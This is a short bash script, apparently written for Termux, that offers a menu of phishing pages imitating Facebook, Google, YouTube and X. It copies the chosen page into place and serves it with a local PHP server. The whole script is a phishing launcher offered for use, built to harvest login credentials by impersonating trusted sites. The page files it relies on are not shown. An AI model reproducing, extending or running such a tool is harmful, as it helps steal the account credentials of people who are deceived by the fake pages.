#!/bin/bash

# Navigate to the directory containing phishing pages

# Show intro
sleep 1
clear
echo "\033[1;33m"
echo "Program by Sushant Mahato"
sleep 1
echo "Developed in Nepal"
sleep 4
clear

# Show options
echo "Choose a phishing page:"
echo "1 > Facebook"
echo "2 > Google"
echo "3 > Youtube"
echo "4 > X"

# Read user input
read -p "Enter choice [1-4]: " lk


# Handle selection
case $lk in
    1)
        cp facebook.html index.html
        ;;
    2)
        cp google.html index.html
        ;;

    3)
        cp youtube.html index.html

        ;;

    4)
        cp x.html index.html

        ;;
    *)
        echo "Invalid option"

        exit 1
        ;;
esac


php -S localhost:8080 -t /data/data/com.termux/files/home/phishing;
